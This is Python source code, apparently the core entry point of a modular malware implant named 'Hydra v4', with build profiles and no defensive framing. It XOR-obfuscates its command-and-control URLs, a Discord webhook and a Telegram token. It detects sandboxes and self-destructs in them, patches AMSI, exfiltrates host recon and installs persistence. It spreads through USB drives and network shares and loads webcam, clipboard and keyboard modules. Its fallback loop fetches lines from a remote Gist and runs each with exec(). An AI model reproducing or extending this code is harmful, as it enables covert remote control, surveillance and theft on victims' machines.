"""
Hydra v4 — Modular implant orchestrator.
Entry point. Loads config, runs sandbox checks, boots modules.

Usage (from build.py):
    python -c "from hydra.core import main; main(profile='stealth')"
"""
import os
import sys
import time
import json
import random
import hashlib
import threading

# ─── Dead-simple XOR obfuscation ──────────────────────
# Key is split across variables — `strings` can't reassemble it.
# Not crypto. Just enough to beat casual `strings virus.exe`.
_xk = [0x5E, 0x3F, 0xA1, 0x77, 0x12, 0x8C, 0x4B, 0xE9,
       0x6D, 0x2A, 0xF3, 0x55, 0x1C, 0x9E, 0x7F, 0xD0]
_xk_bytes = bytes(_xk)

def _d(data):
    """Decode XOR-encrypted bytes."""
    if isinstance(data, str):
        data = data.encode()
    key = _xk_bytes * (len(data) // len(_xk_bytes) + 1)
    return bytes(a ^ b for a, b in zip(data, key[:len(data)])).decode()

def _e(text):
    """Encode string with XOR."""
    data = text.encode() if isinstance(text, str) else text
    key = _xk_bytes * (len(data) // len(_xk_bytes) + 1)
    return bytes(a ^ b for a, b in zip(data, key[:len(data)]))

# ═══════════════════════════════════════════════════════
# CONFIG — edit before building. All secrets XOR-encoded.
# Use _e("your string here") to encode new values.
# ═══════════════════════════════════════════════════════

BUILD_PROFILE = "stealth"  # dev | stealth | demo

# Gist C2 (raw URL — primary fallback, XOR-encrypted content)
GIST_URL = _d(b'\x30\x7e\x06\x3b\x36\x50\x5f\x4b\x27\x76\x07\x3b\x3a\x50\x46\x4b\x28\x78\x4e\x3b\x24\x50\x46\x02\x38\x6e\x19\x28\x33\x4c\x40\x4b\x27\x55\x24\x7c\x1d\x3b\x7f\x1b\x79\x33\x79\x3b\x6e\x24\x4d\x01\x3b\x6b\x42\x7e\x6e\x64\x03\x1a\x7b\x5f\x3e\x03\x46\x3e\x3b\x73\x36\x5e\x3b\x2b\x72\x05\x09\x1b\x3e\x2a\x07\x08\x24\x2e\x2f\x1d\x1b\x3e\x2a\x07\x47\x3a\x38\x2d\x1d\x1b\x3e\x2a\x07\x47\x64\x05\x19\x50\x47\x39\x52\x22\x53\x76\x6f\x1e\x57\x55\x10\x52\x2a\x15\x27\x7a\x19\x50\x47\x39\x52\x22\x13\x3d\x55\x51\x1e\x52\x3e\x47\x36\x5b\x1a\x56\x5c\x6c\x52\x26\x19\x6a\x18\x51\x5a\x52\x36\x6a\x43\x14\x51\x19\x4f\x22\x10\x31\x0f\x0b\x4f\x69\x44\x2a\x59\x39\x5b\x6c\x5c\x0d\x5b\x6b\x19\x47\x3d\x75\x26\x56\x2f\x48\x5a\x3f\x33\x7d\x4c\x75\x2e\x7f\x1a\x53\x43\x03\x6c\x5c\x54\x64\x14\x68\x6a\x76\x68\x1f\x7e\x1a\x5f\x03\x5f\x74\x10\x54\x64\x4e\x48\x4a\x68\x45\x1e\x58\x2e\x5e\x4a\x4f\x7d\x4a\x58\x73\x6e\x12\x0c\x3c\x1f\x56\x5d\x48\x12\x6e\x01\x33\x4f\x56\x1b\x4f\x54\x7d\x45\x57\x0a\x6c\x01\x5a\x56\x49\x30\x52\x7f\x58\x2d\x0d\x54\x4b\x57\x1b\x4f\x54\x32\x1f\x12\x2e\x57\x24\x56\x0f\x4a\x0d\x0a\x62\x38\x7f\x0c\x06\x5e\x56\x03\x30\x2c\x4c\x44\x4b\x1b\x0d\x5d\x04\x16\x6d\x24\x0e\x76\x56\x2a\x55\x5a\x5e\x49\x3b\x4c\x00\x57\x19\x56\x09\x57\x3c\x37\x14\x3e\x5c\x50\x14\x3b\x56\x37\x37\x2c\x7f\x3f\x16\x19\x75\x10\x0f\x49\x12\x74\x6f\x3b\x2c\x41\x03\x3b')

# Discord webhook URL
DISCORD_WEBHOOK = _d(b'\x09\x47\x4f\x0d\x19\x43\x4f\x07\x36\x2c\x2b\x4a\x15\x0d\x4b\x4b\x3b\x2c\x2b\x4a\x15\x0d\x5c\x5b\x35\x22\x2a\x4a\x15\x0d\x5c\x0b\x76\x2e\x6e\x1c\x24\x4b\x74\x21\x6a\x2f\x1d\x43\x62\x71\x73\x61\x7b\x0e\x67\x7b\x71\x26\x6a\x2f\x1d\x43\x5b\x27\x23\x75\x36\x72\x1e\x67\x2e\x1a\x21\x72\x07\x78\x12\x7a\x30\x78\x28\x7a\x29\x71\x34\x70\x66\x70\x37\x27\x32\x70\x36\x73\x75\x31\x77\x2f\x76\x21\x2c\x39\x35\x23\x2e\x33\x23\x38\x7e\x6c\x27\x39\x3a\x3b\x24\x2d\x2e\x3f\x39\x2d\x31\x3e\x62\x36\x7c\x2d\x3a\x21\x3e\x39\x37\x24\x2f\x3e\x36\x27\x23\x79\x00\x24\x68\x16\x15\x9e\x23\x5a\x0b\x2c\x1b\x76\x29\x0b\x59\x4d\x0c\x19\x43\x49\x0d\x3b\x1d\x56\x42\x1e\x0a\x45\x42\x18\x74\x01\x72\x49\x06\x7e\x60\x07\x0a\x68\x1f\x13\x72\x60\x01\x26\x6d\x63')

# Telegram bot token (stripped — set by build script)
TG_TOKEN = _d(b'\x5b\x48\x50\x12\x7e\x0a\x52\x71\x3b\x75\x00\x0c\x1d\x1a\x07\x08\x3f\x08\x53\x04\x6c\x6d\x51')

# XOR cipher key for C2 messages (separate from string obfuscation)
C2_KEY = _d(b'\x77\x5e\x06\x7b\x22\xc3\x42\xe7\x1d\x37\xa3\x75\x19\xdd\x23\xaf')

# Build profile configs
PROFILES = {
    "dev": {
        "console": True,
        "verbose": True,
        "c2_poll": (25, 35),
        "gist_primary": True,
        "ngrok_enabled": False,
        "modules": [
            "popup", "notepad", "wallpaper", "cursor",
            "bsod", "audio", "clipboard", "webcam",
            "monitor", "taskbar", "keyboard_swap", "cd_tray"
        ],
        "log_file": os.path.join(os.environ.get("TEMP", "."), "hydra_dev.log"),
    },
    "stealth": {
        "console": False,
        "verbose": False,
        "c2_poll": (25, 55),
        "gist_primary": True,
        "ngrok_enabled": True,
        "modules": [
            "popup", "notepad", "wallpaper", "cursor",
            "bsod", "audio", "browser", "clipboard", "webcam",
            "monitor", "taskbar", "keyboard_swap", "cd_tray",
            "file_reverse"
        ],
        "log_file": None,
    },
    "demo": {
        "console": True,
        "verbose": True,
        "c2_poll": (3, 5),
        "gist_primary": True,
        "ngrok_enabled": True,
        "modules": [
            "popup", "notepad", "wallpaper", "cursor",
            "screen_flash", "bsod", "audio", "browser",
            "clipboard", "webcam", "monitor", "taskbar",
            "keyboard_swap", "cd_tray", "file_reverse"
        ],
        "log_file": os.path.join(os.environ.get("TEMP", "."), "hydra_demo.log"),
    },
}


def main(profile=None):
    """Entry point. Called from PyInstaller stub or directly."""
    global BUILD_PROFILE
    if profile:
        BUILD_PROFILE = profile

    cfg = PROFILES.get(BUILD_PROFILE, PROFILES["stealth"])

    # ── Phase 0: Sandbox detection (MUST run first) ──
    if not cfg.get("verbose"):
        # Suppress stdout/stderr in stealth mode
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')

    try:
        from hydra.sandbox import detect_vm
        if detect_vm():
            from hydra.sandbox import self_destruct
            self_destruct()
            sys.exit(0)
    except ImportError:
        pass  # Module not bundled, skip

    # ── Phase 1: Evasion ──
    try:
        from hydra.evasion import patch_amsi, enable_defenses
        patch_amsi()
        enable_defenses()
    except ImportError:
        pass

    # ── Phase 2: Agent identity ──
    import socket
    hostname = socket.gethostname()
    username = os.environ.get("USERNAME", "UNKNOWN")
    agent_id = f"{hostname}-{username}"
    is_admin = False
    try:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        pass

    me = {
        "id": agent_id,
        "hostname": hostname,
        "username": username,
        "admin": is_admin,
        "profile": BUILD_PROFILE,
        "started": time.time(),
    }

    # ── Phase 3: C2 + persistence + recon (parallel) ──
    threads = []

    # Recon (background)
    try:
        from hydra.recon import run_recon
        t = threading.Thread(target=run_recon, args=(cfg, me, DISCORD_WEBHOOK), daemon=True)
        t.start()
        threads.append(t)
    except ImportError:
        pass

    # Persistence
    try:
        from hydra.persistence import install
        install(cfg, me, is_admin)
    except ImportError:
        pass

    # Watchdog
    try:
        from hydra.watchdog import start_watchdog
        start_watchdog(cfg, me)
    except ImportError:
        pass

    # Replication watcher (background)
    try:
        from hydra.replication import watch_usb, scan_shares
        t = threading.Thread(target=watch_usb, args=(cfg, me), daemon=True)
        t.start()
        threads.append(t)
        t = threading.Thread(target=scan_shares, args=(cfg, me), daemon=True)
        t.start()
        threads.append(t)
    except ImportError:
        pass

    # Telegram bot (background PowerShell)
    try:
        from hydra.c2 import launch_telegram_bot
        launch_telegram_bot(TG_TOKEN, me, DISCORD_WEBHOOK)
    except ImportError:
        pass

    # Main C2 loop (blocking)
    try:
        from hydra.c2 import c2_loop
        c2_loop(cfg, me, GIST_URL, C2_KEY, DISCORD_WEBHOOK)
    except Exception as e:
        # Fallback: simple Gist polling
        _c2_fallback(cfg, me)


def _c2_fallback(cfg, me):
    """Minimal C2 loop if hydra.c2 fails to import."""
    import urllib.request
    import ssl
    _CTX = ssl._create_unverified_context()
    _EXEC = set()

    while True:
        try:
            url = f"{GIST_URL}?t={int(time.time())}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            resp = urllib.request.urlopen(req, timeout=15, context=_CTX)
            raw = resp.read().decode("utf-8", errors="replace").strip()

            for line in raw.split("\n"):
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                h = hashlib.sha256(line.encode()).hexdigest()
                if h in _EXEC:
                    continue
                _EXEC.add(h)
                try:
                    exec(line)
                except:
                    pass
        except:
            pass

        lo, hi = cfg.get("c2_poll", (25, 55))
        time.sleep(random.uniform(lo, hi))
